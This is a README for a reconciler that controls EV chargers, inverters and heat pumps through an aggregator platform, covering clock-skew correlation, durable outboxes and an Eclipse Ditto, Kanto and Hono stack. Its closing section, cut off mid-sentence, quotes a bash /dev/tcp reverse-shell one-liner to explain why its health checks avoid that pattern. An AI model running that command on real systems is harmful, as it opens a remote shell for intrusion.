# device-reconciler

A desired-state reconciler for energy devices — EV chargers, inverters, batteries,
heat pumps — reached through an **aggregator platform** that exposes two separate
channels with two separate clocks.

The reconciler tracks what was requested, what the device reported, and whether
that report is evidence that the request took effect. It preserves uncertainty
when the two clocks cannot be compared reliably, and keeps commands, deadlines
and recovery state durable across process restarts.

## What it does

- **Decides from evidence:** prefers a device's applied-generation counter, then
  uses declared clock and latency bounds to classify telemetry as before, after,
  or not yet distinguishable from a command.
- **Runs a durable control loop:** PostgreSQL stores phases, generations, clock
  estimates, deadlines, inbox deduplication and an idempotent command outbox.
- **Handles fleet failures:** per-vendor rate limits, circuit breakers, bounded
  concurrency and jittered backoff contain slow or failing upstream services.
- **Respects override policy:** schedules, local changes and operator intent have
  explicit precedence, with hold and conflict outcomes.
- **Publishes state:** Eclipse Ditto exposes desired and reported properties;
  the HTTP view model exposes confidence, confirmation deadlines and faults.
- **Exercises real transport:** the optional Eclipse Kanto → Hono → Ditto stack
  connects a local device twin through separate telemetry and command paths.
- **Makes failures reproducible:** a seeded mock aggregator injects delay,
  reordering, duplicates, rejection and acknowledgements without actuation.

## Why it exists

A platform accepting a command does not prove that a device applied it. Delayed
telemetry can describe the state before the command, and comparing timestamps
from independent clocks can produce a false confirmation. This project makes
those distinctions explicit and keeps them intact through retries and restarts.

The design is explained in
[“Two Channels, Two Clocks”](https://fblln.github.io/articles/two-channels-two-clocks/).
For the readiness probes, see
[“The Health Check Was a Reverse Shell”](https://fblln.github.io/articles/the-health-check-was-a-reverse-shell/).

---

## The problem, in one paragraph

You cannot talk to consumer energy hardware directly. You talk to a platform,
which talks to a manufacturer's cloud, which talks to the device — over two
channels that share nothing:

|            | command channel                | telemetry channel                             |
| ---------- | ------------------------------ | --------------------------------------------- |
| direction  | you → device                   | device → you                                  |
| timestamps | **your** clock                 | the **device's** clock                        |
| tells you  | the instruction was _received_ | what the device was doing at some past moment |
| latency    | one path                       | a different path                              |
| failure    | one mode                       | a different mode                              |

So: **an ack is not an actuation**, **telemetry describes the past**, and **the
two timestamps are not comparable**. Which produces the question:

> I asked the charger to start 90 seconds ago. Telemetry says `STOPPED`, captured
> at a device time I cannot directly compare to my own.
> **Is the command failing, is my data stale, or can I simply not tell yet?**

The answer is tri-state — `after`, `before`, and **cannot tell** — and `unknown`
is a legitimate outcome that must be waited out rather than guessed past. Where a
device echoes back which instruction it last applied, the question collapses to
integer comparison and no clock is involved at all. That is always preferred.

## Submitting intent safely

`PUT /v1/devices/:id/intent` requires an `Idempotency-Key` header and a JSON
body such as `{"charging":true,"source":"operator"}`. Generate a key once per
user action and reuse it after a timeout or missing response. The response
contains `operationId`, `status`, `phase`, and a `statusUrl` (also in `Location`).
`ACCEPTED` means stored for evaluation, not applied by the device. Poll the
status URL for current progress, including the command deadline once issued.

The database records the key and intent in one transaction. Reusing a key with
a different payload returns 409. Concurrent requests with the same key return
the same operation. A different key with the same target and source also joins
the current operation, preserving its deadline and override metadata. This
includes failed operations: repeatedly pressing Start does not silently retry a
failure. A superseded operation remains identifiable and reports `SUPERSEDED`;
replaying it never restores its old intent.

To deliberately retry, send `POST /v1/devices/:id/intent/retry` with a new
`Idempotency-Key` and `{"retryOf":"<failed-operation-id>"}`. Only the current
failed operation is eligible. Repeating this request returns the same new
operation; a stale or nonfailed operation returns 409. Existing command counters
and clock evidence survive the retry.

Clients should immediately show receipt, display pending confirmation separately
from success, and reuse the action key while waiting. There is no control UI in
this repository: these are API guarantees, not a claim that buttons are disabled.
Keys are scoped to a device and retained without automatic expiry. A multi-tenant
service must also scope them to its authenticated tenant and define a retention
policy before exposing this local API publicly. Delivery retries still use the
outbox command ID; user-action identity does not replace device-side deduplication.

## One fleet, several platforms

A reconciler that talks to more than one platform is holding more than one set
of behaviours. A vendor whose devices echo a generation is confirmed by integer
comparison, immediately. A vendor reached over Modbus and polled every five
minutes cannot be confirmed until `maxLatency + skewBound` has passed and a
capture has arrived after that. Fleet-wide numbers have to be sized for the
worst vendor, so the fast one waits the slow one's timeout to learn that a
command failed.

`VENDOR_TIMING` overrides the three timing knobs per vendor, as JSON, merging
over the fleet defaults:

```json
{ "acme": { "commandTimeout": 60000 }, "old-modbus": { "commandTimeout": 900000, "maxLatency": 420000 } }
```

An unconfigured vendor gets the fleet values, so adding a vendor never requires
configuring one. Unknown keys and non-numbers are refused at startup rather
than ignored. `clockConfirmationWindow` reports what is left of a timeout after
the clock floor; a vendor that echoes a generation may legitimately run a
negative window, because it never consults a clock.

The evidence for setting these is already in `/readout.txt`, which tallies
correlation outcomes per vendor: a vendor at a high clock-fallback rate needs
room, and one at zero can have its deadline cut.

## How it works

### 1. Durable in-flight state

The phase holds a command id, a generation, a deadline and a device-clock
watermark. Persisting them prevents a restart from forgetting an outstanding
command and issuing it again:

- **phase, clock model and generation counter live in Postgres** (`db/schema.sql`),
  written in one transaction with the intent to send.
- **the deadline is a column, not a `setTimeout`.** `device.wake_at` plus
  `where wake_at <= now` is the timer, so it survives `SIGKILL`.
- **an outbox** separates deciding from sending, because two systems cannot be
  updated atomically and both orderings of "POST then write" are broken. Delivery
  is at-least-once, which is safe _only_ because the command id is also the
  `Idempotency-Key` — the two halves are a pair.
- **generations are minted by the database**, since a counter handed out twice
  makes a device's echo ambiguous.
- **work is claimed with `for update skip locked`** and held on an expiring
  lease, so a worker killed mid-reconcile strands nothing.

Time is stored as **bigint milliseconds, not `timestamptz`** — deliberately, so
that SQL cannot quietly perform the cross-clock comparison TypeScript forbids.
The reasoning is at the top of `db/schema.sql`.

### 2. Real I/O against a runnable mock platform

`src/platform/` is a real HTTP service, in this repository, that runs as a
container: OAuth2 client-credentials with short-lived tokens, a paginated device
list, a command endpoint that **requires** `Idempotency-Key` and replays the
original response, per-vendor rate limits returning `429` with `Retry-After`, and
signed webhook delivery that **retries, duplicates and reorders**.

Each simulated device has its own clock skew (a tenth of the fleet is minutes
wrong), telemetry latency, actuation delay, and pathology — acks-but-never-
applies, rejects-everything, reports-`APPLIED`-early, counts-or-doesn't. All of it
is a pure function of `(SEED, deviceId)`, so a failing run is replayable and
adding a device does not reshuffle the fleet.

Ingest (`src/service/ingest.ts`) is the only externally reachable surface, so it
is treated as a trust boundary: HMAC-SHA256 over `timestamp.body` with the
timestamp _inside_ the signed material, `timingSafeEqual`, a freshness window,
and replay protection as a unique index on `inbox.event_id`.

### 3. Scale and backpressure

Three vendors with deliberately different quotas, because a single global limit
starves the fast vendor or gets the slow one banned. Per vendor: a token bucket,
a circuit breaker with a half-open probe, and jittered exponential backoff. Work
runs through a bounded queue the connection pool is sized from. The four dispatch
outcomes are kept distinct because the right response differs:

- **gated** (our own limiter) — no attempt consumed; the request never happened.
- **429** — the attempt is _returned_; a command abandoned for being throttled is
  a command abandoned for being popular.
- **5xx / timeout** — retry with backoff, and count it against vendor health.
- **other 4xx** — abandon; retrying a malformed request is pure load.

Reconciliation is **webhook-driven plus swept**: events give latency, the sweep
gives completeness. A purely event-driven reconciler never revisits the device
that stopped talking, which is the one most likely to have drifted.

### 4. Observability — the two numbers that are the point

OpenTelemetry metrics via a **Prometheus pull exporter** (correct with nothing on
the other end; there is no collector in this repo and no cloud anywhere), plus
structured JSON logs and a readout at `/readout` and `/readout.txt`:

```
decisions 555  (IDLE 131  CONVERGED 266  ISSUED 76  SUSPENDED 24  FAILED 58)

vendor          correlated   unknown   clock-fallback   after   before
ALL                   102     62.7%           89.2%      30        8
badger                 40     62.5%           92.5%      14        1
hare                   25     56.0%           88.0%       7        4
tortoise               37     67.6%           86.5%       9        3
```

That is a real forty-second run against the stack, not an illustration. Both
numbers are high, and the reason is worth stating because it is the first thing
a reader should query: **the rates are weighted by decisions, not by devices.**
Roughly half the simulated fleet reports a counter, yet 89% of correlations take
the clock fallback — because a device that echoes a generation resolves on its
first correlation and stops, while a device that cannot be correlated keeps
attempting one on every wake until its deadline. The devices that cannot decide
dominate the denominator by construction.

That makes the rate the right answer to "how much of my decision-making is
guesswork" and the wrong answer to "what fraction of my fleet counts". Both are
worth knowing; only the first is what this number is.

- **unknown rate** — correlations that could not be decided at all. Zero means the
  tri-state was theatre and a boolean would have done. High means the declared
  skew and latency bounds are too loose for this fleet, which is an operational
  fix, not a code change.
- **clock-fallback rate** — correlations decided by clock bounds rather than a
  generation echo. This is the cost of the fleet's hardware in one number, and the
  procurement argument for devices that count.

`reconcile()` records the branch it took in `Step.correlation`, so the readout
can show how each decision was reached and how often evidence remained unknown.

Timeouts are reported as three distinct faults with three distinct owners, from
Azure's `ac` status: **silence** (the instruction may never have arrived — look at
connectivity and the platform's queue), **acknowledged** (it arrived and nothing
happened — look at the device), and **in progress** (the device said it was
working and never finished — it knows something it has not told us). A timeout
that cannot tell them apart sends somebody to read the wrong logs.

### 5. Override precedence, as a first-class concept

A command advances the generation; a human at the panel does not. So a fresh
reading that disagrees with intent while still reporting the generation we
converged at is _exact_ evidence that somebody else moved the device — same
channel, same counter, no clock. The response is a policy decision: a tariff
schedule and a person changing the heating can require different precedence.

Retrofitting a policy onto a loop that re-asserts unconditionally is painful, so
intent here has a **source** and a **precedence** from the start
(`src/core/override.ts`), resolved _upstream_ of the decision function so the
decision function remains focused on evidence:

- `schedule` — a tariff window or optimiser. Standing instruction, nobody watching.
- `local` — inferred from a third-party change. Never written by us.
- `operator` — explicit, attributable, recent, through our API.

Three outcomes: **assert** (converge, the normal case), **hold** (a local change
outranks a schedule for a bounded window, then the schedule resumes on its own —
via a durable timer, so it survives a restart), and **conflict** (two deliberate
writers disagree; stop asserting _and say so_, because the resolution is a human
decision and the only wrong move is to pick quietly). Hold and conflict both stop
asserting and differ in whether anyone is told — a system that cannot tell them
apart either pages on every button press or silently loses arguments with its
operator. The model is Kubernetes server-side apply: field ownership, and
conflicts reported rather than resolved by last-writer-wins.

The `local_change_at` timestamp is persisted because it **cannot be re-derived**:
the evidence is the device still reporting the generation we converged at, and the
moment we re-assert, the generation advances and the evidence is gone.

### 6. The view model — what a UI may honestly say

`GET /v1/devices` serves the half of this design a person ever sees. The
vocabulary is Home Assistant's, which separates two ideas that look alike:
[`assumed_state`](https://www.home-assistant.io/integrations/lock.mqtt/) (we
never get a state report from this device, so show buttons rather than a toggle
— the widget shape carries the uncertainty) and `optimistic` (show the new
state immediately on sending a command).

```
dev-0000 hare      FAILED     not charging [failed, toggle], fault: terminal: rejected-by-vendor
dev-0001 badger    CONVERGED  charging     [confirmed-estimated, toggle]
dev-0005 tortoise  CONVERGED  not charging [confirmed-exact, toggle]
```

The view model has two independent controls:

- **`assumed` is computed from available evidence.** It is true when there is
  neither an observed generation nor a clock sample. The UI uses separate
  buttons when assumed and a toggle otherwise. This is a proxy: the current
  implementation does not persist whether a reading has ever been successfully
  correlated with a command. A clock sample can still leave correlation unknown.
- **`optimistic` is configuration, per device.** It determines whether the UI
  displays the requested state while confirmation is pending. Display policy
  never changes what the reconciler considers confirmed. Timeout and clock
  bounds are configured separately.

And because the loop holds a **deadline**, the view can say
`confirming start (143s left)` instead of a spinner with no end, and name which
of the three faults happened instead of the word “failed”. That is the whole
argument for modelling the uncertainty rather than hiding it: it is the only
reason the interface has anything honest to say.

## The twin store is a real project, and so is the edge

The strongest thing about this problem is that somebody else already published
the half that is not the loop, and said so.

### Eclipse Ditto holds the two states and declines to reconcile them

[Ditto](https://eclipse.dev/ditto/basic-feature.html) is an open-source
digital-twin framework that separates **reported** state (what the device said)
from **desired** state (what a backend wants), persists both and indexes them.
Its own documentation then says, of the gap between the two: _the logic for
reconciling desired state with actual state is up to your application or device
firmware_.

That sentence is this repository's brief. So Ditto runs in `compose.yaml` and
this reconciler is the application its docs ask for — which is worth more than a
twin I wrote, because a twin I wrote would agree with me by construction.

**The split is not arbitrary.** Ditto models a twin: the state of a thing, now.
It has no model for a command in flight, its deadline, its delivery attempts,
whether it has been dispatched exactly once, or a timer that must still fire
after a restart. So:

| in Ditto                         | in Postgres                                         |
| -------------------------------- | --------------------------------------------------- |
| desired and reported state       | the phase, and the in-flight command inside it      |
| per device, queryable, versioned | outbox, inbox, durable timers, leases, decision log |

Putting the phase in a twin store means encoding a state machine as twin
properties and losing the transaction that makes the outbox atomic. Putting the
twin in Postgres means reimplementing Ditto, badly.

**Ditto's `_revision` cannot be the generation**, and this is the finding worth
carrying away. The obvious shortcut is to let the twin store mint the
desired-state counter, the way the Kubernetes API server sets
`metadata.generation` and Azure IoT Hub manages `$version`. Ditto does maintain
a monotonic `_revision` per thing. But it advances on **any** modification to
the thing, including every reported-property write that lands from telemetry,
whereas `metadata.generation` advances only when the spec changes. A counter
that moves when the device reports in cannot say which instruction the device
has acted on — it will advance several times between a command and its
confirmation for reasons that have nothing to do with the command.

So the platform minting its own per-device counter is not a preference. It is
forced by what `_revision` means, which is the strongest available argument for
["who mints the counter"](#who-mints-the-counter) below.

**On the wire**, Azure IoT Plug and Play's acknowledgement convention rather
than field names invented here. `desiredProperties` carries the value and the
platform's version; `properties` carries `av` (the version being acknowledged),
`ac` (200 applied, **202 in progress**, 400 refused, 500 failed) and `ad` (the
reason the loop actually gave). An in-flight command reports 202, so anything
subscribed to the twin sees the ack-is-not-an-actuation distinction in a
published vocabulary instead of this project's:

```json
{
  "features": {
    "charging": {
      "properties": {
        "charging": {
          "value": true,
          "av": 1,
          "ac": 400,
          "ad": "terminal: rejected-by-vendor; waiting for a new intent"
        },
        "powerDeliveryState": "PLUGGED_IN:STOPPED",
        "deviceTimeOnDeviceClock": 1794077684219,
        "observedGeneration": null
      },
      "desiredProperties": { "value": true, "version": 1, "source": "operator" }
    }
  }
}
```

That is a real thing read back out of a running Ditto, including the 400 for a
vendor that refused the command. `deviceTimeOnDeviceClock` is named for the
clock it is on because a twin store has no type system to brand it with, and the
name is the only defence against somebody comparing it to one of ours.

**Four Ditto services, not nine.** Ditto's own deployment runs policies, things,
things-search, connectivity, a gateway, two UIs and an nginx doing basic auth.
Dropped here: `things-search` (only needed for RQL queries; this addresses
things by id), `connectivity` (only needed for Ditto's own AMQP/MQTT/Kafka
connections), both UIs, and nginx — whose entire job is to authenticate and
forward the identity as `x-ditto-pre-authenticated: nginx:<user>`. With
`ENABLE_PRE_AUTHENTICATION=true` the client sends that
[header](https://eclipse.dev/ditto/basic-auth.html) itself, and nginx, its
htpasswd and its mounted config all go with it. The trust model is unchanged for
a local stack with no published gateway port.

### Eclipse Kanto is the other end of the wire, opt-in

[Kanto](https://eclipse.dev/kanto/) runs on a device or gateway and keeps a
[local digital twin](https://eclipse.dev/kanto/docs/concepts/local-digital-twins/)
that works offline, synchronising both ways when the link returns: the cloud
sets desired properties, the edge reports features and values. Same semantics as
Ditto, on the device.

`docker compose --profile edge up -d --wait` brings it up. **Verified by running
it**, not by reading about it:

- it connects to a plain `tcp://` broker with **no TLS, no Eclipse Hono and no
  AWS**. Kanto demands a CA certificate only when the hub scheme is a secure
  one, which is what makes a fully local, credential-free edge tier possible at
  all. Its documented cloud paths are AWS IoT, Azure IoT Hub, or Hono — none of
  them Ditto directly, and two of them ruled out here.
- it subscribes and publishes on Hono's MQTT topics (`e/#`, `t/#`,
  `command//+/req/#`, `edge/thing/request`) carrying **Ditto Protocol**
  envelopes. Its [`go.mod`](https://github.com/eclipse-kanto/local-digital-twins)
  requires `eclipse/ditto-clients-golang` and it implements Ditto's topic
  criteria, so the protocol match with the cloud twin is real rather than hoped
  for.
- a round trip through its local bus works. Publishing to `edge/thing/request`
  returns
  `{"deviceId":"energy:edge-0001","tenantId":"energy","policyId":"energy:edge-0001"}`
  — note the `policyId`, which is Ditto's concept, from Kanto's own mouth.

Kanto publishes **no container image**: its
[releases](https://github.com/eclipse-kanto/kanto/releases) are `.deb`, `.rpm`
and `.tar.gz` for linux x86_64/arm64/armv7, built to be installed as systemd
units on a device. So `kanto/Dockerfile` downloads the release tarball and
copies out the static Go binary. That is the honest cost of putting it in
Compose, and it is why this is a profile rather than part of the default stack.

### Eclipse Hono makes the two directions structural

The optional [Hono stack](hono/README.md) connects Kanto through Hono's MQTT
adapter and separate Kafka telemetry/event and command topics to Ditto's
connectivity service. A second instance of the existing durable reconciler reads
device-owned reported properties and dispatches desired properties from its
outbox. It never treats a transport acknowledgement as actuation.

```sh
npm run hono:up
npm run hono:test
npm run hono:edge
npm run hono:test:edge
```

The direct transport test checks both directions and authenticated device
isolation. The edge test checks Kanto's local twin and reconnect synchronization,
then requires the durable reconciler to wait on ambiguous clock evidence and
confirm only when the device echoes its generation. See the Hono README for the
sample contract, architecture, local ports and deliberate limits.

### Why a simulated fleet survives next to real software

Because they are good at different things, and this is a design decision rather
than a shortcut.

Kanto gives realism. It does not give **controllable failure injection**. A
clock ten minutes fast, telemetry delivered out of order, a duplicate webhook,
a device that acknowledges and never applies, half a fleet that reports a
counter and half that does not — none of that can be asked of real software on
demand, and all of it is the pathology matrix the tests are worth running for.
`SEED` makes every one of those reproducible, which is what lets an agent replay
an interesting failure instead of waiting for it.

The seeded fleet covers the failure matrix; the Kanto/Hono integration tests
exercise the real transport and local twin synchronization.

## Prior art

The following references explain the protocols and reliability patterns used
in this implementation.

This is not a novel problem, and the industry has converged on **order by a
counter, not by a clock**:

- **Kubernetes API conventions** — [api-conventions.md](https://github.com/kubernetes/community/blob/master/contributors/devel/sig-architecture/api-conventions.md).
  `metadata.generation` is "a sequence number representing a specific generation
  of the desired state", "Set by the system and monotonically increasing,
  per-resource". `status.observedGeneration` is "the `generation` most recently
  observed by the component responsible for acting upon changes to the desired
  state of the resource", and a condition's own `observedGeneration` is "the
  .metadata.generation that the condition was set based upon". Note the doc says
  _some_ resources report it, and attributes it to "the component responsible" —
  not specifically to a controller. [kstatus](https://github.com/kubernetes-sigs/cli-utils/blob/master/pkg/kstatus/README.md)
  is the library that reads those conventions to decide whether a resource has
  actually reconciled.
- **Azure IoT Plug and Play** — [the acknowledgement convention](https://learn.microsoft.com/azure/iot-pnp/concepts-convention),
  on [device twins](https://learn.microsoft.com/azure/iot-hub/iot-hub-devguide-device-twins).
  The hub manages a `$version` on the desired section; the device acknowledges by
  writing back a reported property carrying `av` (the acknowledged version), `ac`
  (a status: 200 accepted, **202 in progress, to finish later at 200**, 400/500
  refused or failed) and an optional `ad` description. **This repo's mock
  platform implements that convention**, `ac: 202` included — see
  `src/platform/sim.ts`. The 202 confirms nothing; its value is diagnostic, and
  that is exactly why it is worth having.
- **AWS IoT Device Shadow** — [shadow documents](https://docs.aws.amazon.com/iot/latest/developerguide/device-shadow-document.html):
  desired / reported / delta, a `version` that increments on every update and is
  checked for optimistic concurrency, and a `clientToken` that ties a response
  back to the request that caused it. The round-tripped client counter in this
  repo's command endpoint plays the `clientToken` role.
- **Eclipse Ditto** — [digital twins](https://eclipse.dev/ditto/basic-feature.html).
  Ditto persists and indexes both a reported and a desired state, and its own
  documentation says the reconciling logic between them "is up to your
  application or device firmware". It stores the two states and does **not**
  drive the device toward the target. That gap is what this repository is. (There
  is an [open epic](https://github.com/eclipse-ditto/ditto/issues/696) proposing
  Ditto clear `desiredProperties` once reported catches up — a proposal, not
  shipped behaviour.)
- **Eclipse Hono** — [telemetry vs command &amp; control](https://github.com/eclipse/hono)
  as explicitly separate APIs in opposite directions, with wildly different
  volumes. **Eclipse Kanto** ([site](https://eclipse.dev/kanto/)) is the
  edge-side counterpart, bridging a device's twin channel to Hono and to the AWS
  Device Shadow.
- **OCPP 1.6** — [spec via the Open Charge Alliance](https://openchargealliance.org/download-ocpp/)
  (behind the download page; released 2015, no stable deep link).
  `RemoteStartTransaction.conf` reports only that the charge point "has accepted
  the request and will attempt to start a transaction"; the real state arrives
  separately via `StartTransaction` and `StatusNotification`, and the two are
  observed to diverge. _Ack-is-not-actuation, in a spec._ The serious open
  implementation is [EVerest](https://github.com/EVerest/everest) (LF Energy,
  Apache 2.0, OCPP 1.6 and 2.0.1).
- **Z-Wave Supervision CC** — [Silicon Labs docs](https://docs.silabs.com/z-wave/7.21.3/zwave-api/supervision)
  and [zwave-js](https://github.com/zwave-js/node-zwave-js/discussions/6515).
  The same problem solved at the wire protocol: a supervised SET is answered with
  a status saying whether the command was understood **and executed**, and
  zwave-js separates never-sent, received-but-not-executed and invalid-value,
  falling back to a read-back GET for devices that refuse Supervision — with the
  caveat that a GET straight after a SET can return a transitional value.
- **Home Assistant** — [`optimistic` vs `assumed_state`](https://www.home-assistant.io/integrations/lock.mqtt/),
  where a core developer's distinction is that _assumed_ means state is never
  reported at all, while _optimistic_ means acting as though the command worked.
  [aiohomematic](https://sukramj.github.io/aiohomematic/user/features/optimistic_updates)
  applies an optimistic update, starts a 30-second timer, and reverts with a
  warning if nothing confirms. Optimistic entities also have no confirmed state
  after a restart — **the persistence gap, in production software**.

On ordering events across clocks you do not control:

- **Lamport 1978**, _Time, Clocks, and the Ordering of Events in a Distributed
  System_, CACM 21(7):558–565, [doi:10.1145/359545.359563](https://doi.org/10.1145/359545.359563).
  Logical clocks "may be implemented by counters with no actual timing
  mechanism" — the original statement of why a counter beats a clock. (The DOI
  resolves in a browser; ACM returns 403 to automated requests.)
- **Cristian 1989**, _Probabilistic clock synchronization_, Distributed Computing
  3:146–158, [doi:10.1007/BF01784024](https://doi.org/10.1007/BF01784024).
  Reading a remote clock across unbounded delay yields an _interval_, not a
  point; the midpoint minimises maximum error, and a successful read tells you
  the precision achieved. This is the formal shape of `capturedAfter`.
- **Spanner**, OSDI 2012, [paper](https://research.google/pubs/spanner-googles-globally-distributed-database-2/).
  `TT.now()` returns `[earliest, latest]`, and commit wait _pays_ for the
  uncertainty rather than hiding it. The closest architectural precedent for
  tri-state correlation: the interval is exposed, and the system waits it out
  instead of collapsing it into a guess.
- **RFC 5905 (NTP)**, [§10, the clock filter](https://www.rfc-editor.org/rfc/rfc5905).
  `src/core/clock.ts` keeps exactly one number — the minimum observed delay —
  for the reason NTP does: delay is non-negative and variable, so the minimum is
  the tightest available estimate. The crisp phrasing that the minimum delay
  "generally represents the most accurate offset statistic" is
  [NTPsec's documentation](https://docs.ntpsec.org/latest/stats.html), not the
  RFC's normative text. The asymmetry matters here and is derived in the file:
  that minimum bounds the offset from _above_ only, which is why proving "after"
  additionally requires a declared maximum latency.
- **The Dataflow Model**, Akidau et al., PVLDB 8(12):1792–1803,
  [paper](https://www.vldb.org/pvldb/vol8/p1792-Akidau.pdf). Watermarks as a
  bound on event-time completeness. Borrowed here by name: the per-device
  watermark keeps "is anything new?" an exact same-clock comparison, so the lossy
  cross-clock estimate is needed in exactly one place.

The durable execution layer uses these patterns:

- **Transactional outbox** — [the pattern](https://microservices.io/patterns/data/transactional-outbox.html),
  for the reason in `db/schema.sql`: deciding and sending cannot be made atomic,
  and both orderings of "POST then write" lose or duplicate.
- **Idempotency keys** — [Stripe's](https://docs.stripe.com/api/idempotent_requests),
  which replay the original response for a repeated key. The mock platform
  implements this and **requires** the header, because a platform that accepts
  unkeyed commands cannot promise at-most-once actuation.
- **Webhook signatures** — [Stripe's scheme](https://docs.stripe.com/webhooks):
  `t=…,v1=…`, with the timestamp inside the signed material and a replay window
  backed by event-id deduplication.
- **`SELECT … FOR UPDATE SKIP LOCKED`** — [Postgres docs](https://www.postgresql.org/docs/current/sql-select.html).
  The whole work-distribution mechanism: no broker, no partition assignment, no
  leader election.
- **Backoff with jitter** — [the AWS Builders' Library article](https://aws.amazon.com/builders-library/timeouts-retries-and-backoff-with-jitter/),
  whose measurements are why `src/core/backoff.ts` uses full jitter rather than
  plain doubling.
- **Kubernetes server-side apply** — [field ownership and conflicts](https://kubernetes.io/docs/reference/using-api/server-side-apply/).
  The model for `src/core/override.ts`: when two managers disagree, report a
  conflict to whoever owns the field rather than letting the last writer win.
- **Temporal** — [flashing 2,300 conference badges](https://temporal.io/blog/ignition-flashing-2-300-conference-badges-with-temporal),
  one durable state machine per physical device, surviving devices that reboot
  mid-process. The closest analogue to the durable-deadline half here, and worth
  considering instead of hand-rolling timers — though no maintained open-source
  project implements the whole pattern for this domain.

## Who mints the counter

The counter must be minted at the **single serialisation point for a device's
desired state**. Kubernetes sets `metadata.generation` in the API server; Azure
IoT Hub manages `$version` in the hub. Two writers each minting their own
sequence produce counters that cannot be compared, and each reads the other's
work as a third-party change. The counter therefore belongs in durable storage
with a single serialization point per device.

This repository has two serialisation points and uses both, for different jobs:

- **the platform** mints `av` on the way in, before the device is consulted,
  exactly as Azure does. A client never invents it; it is read from the
  acknowledgement and never sent in a request.
- **our database** mints the client generation, under the device's row lease, via
  a monotonic column. `FOR UPDATE SKIP LOCKED` plus that column means exactly one
  writer advances it per device, across any number of reconciler processes — the
  same guarantee an API server gives, obtained from the row lock rather than from
  there being only one process.

Both are round-tripped. The client generation is what correlation compares,
because it is the only counter in a namespace the reconciler can check against
its own phase — `av` is not one until the acknowledgement arrives, which is
strictly after a phase has already been committed saying a command is in flight.
A platform offering only `av` forces the clock fallback for one whole capture
interval after every command; this one offers both, and the readout reports how
often the fallback was needed anyway.

## Layout

| path                | what                                                                                                                     | why separate                                                                                                                      |
| ------------------- | ------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------- |
| `src/core/`         | the pure half: time, clock, correlation, decision, contracts, rate limit, breaker, backoff, schedule, signature, readout | no I/O, no `Date.now()`, no randomness it does not receive — testable with a virtual clock, and the only code under the 100% gate |
| `src/platform/`     | the runnable mock aggregator platform                                                                                    | a fake with a clock, because the failures here are timing failures                                                                |
| `src/adapter/`      | HTTP client and the per-vendor gate                                                                                      | the error model is the design: outcomes split by what the caller should _do_                                                      |
| `src/store/`        | Postgres: devices, outbox, inbox, channels, decisions                                                                    | one parse boundary; the two channels stay two tables                                                                              |
| `src/service/`      | worker, dispatcher, ingest, sweep, queue, report                                                                         | the loops. No decisions live here                                                                                                 |
| `src/twin/`         | the Ditto adapter, and the phase → Plug and Play mapping                                                                 | Ditto's resource paths in one file, the reconciler's phases in another: swapping the twin store is a change to one of them        |
| `src/app.ts`        | the reconciler process                                                                                                   | wiring only                                                                                                                       |
| `db/schema.sql`     | the durable state, with the reasoning                                                                                    | the outbox and bigint-milliseconds notes are the two to read                                                                      |
| `kanto/`            | the Dockerfile Kanto does not ship, and its config                                                                       | the edge tier is opt-in, so its cost is opt-in too                                                                                |
| `test/core/`        | unit, contract and property tests on a virtual clock                                                                     | the only code under the 100% gate                                                                                                 |
| `test/integration/` | Testcontainers Postgres, the platform in process, a live Ditto                                                           | SQL cannot be tested against a fake of my beliefs about SQL                                                                       |

`src/core/` contains the time model, correlation rules and reconciliation state
machine. It has no I/O; callers supply time and observations, making the same
rules usable in deterministic tests and the running service.

## Running it

```bash
npm install
npm run up          # docker compose up -d --wait — seven services, all healthy
npm run demo        # drives the fleet and prints the readout
npm run check       # every gate: typecheck, lint, format, coverage, unit, integration
npm run logs
npm run down

docker compose --profile edge up -d --wait   # plus Mosquitto and Eclipse Kanto
```

`npm run up` starts Postgres, MongoDB, three Ditto services, the simulated
aggregator platform and the reconciler. Useful endpoints once it is up:

| endpoint                                      | what                                                     |
| --------------------------------------------- | -------------------------------------------------------- |
| `localhost:9910/v1/devices`                   | the **view model**: confidence, widget, countdown, fault |
| `localhost:9910/readout.txt`                  | the two headline rates, as text                          |
| `localhost:9911/metrics`                      | the same, as Prometheus                                  |
| `localhost:8080/api/2/things/energy:dev-0000` | the twin, in Ditto (needs the pre-auth header)           |

`--wait` returns only once every service reports healthy, so a script or an agent
can bring the stack up and start asserting with no `sleep`. That works because
every service has a real health check — see the next section, which is not a
tangent.

Local, without Docker, needs only a Postgres:

```bash
PORT=9900 WEBHOOK_URL=http://localhost:9910/webhooks npm run platform
DATABASE_URL=postgres://... npm run reconciler
```

Requires Node 24+ (the image and CI run 26), which strips TypeScript natively —
**no build step, no bundler, no `dist/`**. Dev tooling is TypeScript 7, oxlint
1.x, Prettier 3.x and [Testcontainers](https://node.testcontainers.org/), all
current.

### What the stack costs

Measured, because "it runs locally" is a claim with a number behind it. Seven
services, images already pulled, on a laptop:

```
cold start to all-healthy        28s   (docker compose up -d --wait)
resident total                1.77GB

ditto-things                  512MiB
ditto-policies                470MiB
ditto (gateway)               465MiB      three JVMs: 1.45GB, 82% of the stack
mongodb                       108MiB
platform (simulated fleet)     84MiB
reconciler                     76MiB
postgres                       53MiB
```

Two things follow, and the second is the one worth arguing about.

**The JVM twin store dominates.** 82% of the memory is the three Ditto
services, which is the price of using a real twin store rather than a fake, and
it is why `things-search` and `connectivity` are dropped rather than kept "in
case". Dropping Mongo is not available — Ditto's released persistence is
MongoDB-only, and PostgreSQL support is
[an open proposal](https://github.com/eclipse-ditto/ditto/issues/2629), not a
shipped feature.

**Consolidating onto one datastore would be a false economy.** The obvious tidy
— Mongo is unavoidable, so make it the only datastore and drop Postgres — costs
53MiB, 3% of the stack, and buys a rewrite of the outbox, the durable timers and
the `for update skip locked` work claim into single-document modelling, because
a standalone MongoDB has no multi-document transactions. Two datastores is the
honest answer here: one is Ditto's, dictated by Ditto, and one is ours, chosen
for the transaction the outbox needs. "Fewer moving parts" is a good instinct
that this measurement does not support.

**The fast loop needs none of it.** `npm run test:core` is 166 tests in ~0.3s
against no containers, no network and no clock — `src/core/` has no I/O by
construction, which is the whole reason it is a separate directory. The
integration suite starts its own throwaway Postgres per file; only the twin
tests and the demo want the full stack.

## Health checks are not `/dev/tcp`

Every readiness probe here is either an exec-form HTTP request from the runtime
the image already ships (`src/platform/healthcheck.ts`) or `pg_isready`. None of
them is `bash -c '< /dev/tcp/127.0.0.1/8080'`.

That line is the conventional answer for a container with no `curl`, and it is
byte-for-byte the construct every reverse-shell detection rule is written
against: a process wiring one of its own standard streams to a network connection
instead of a terminal. A runtime sensor cannot distinguish it from
`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`, because the only difference is the
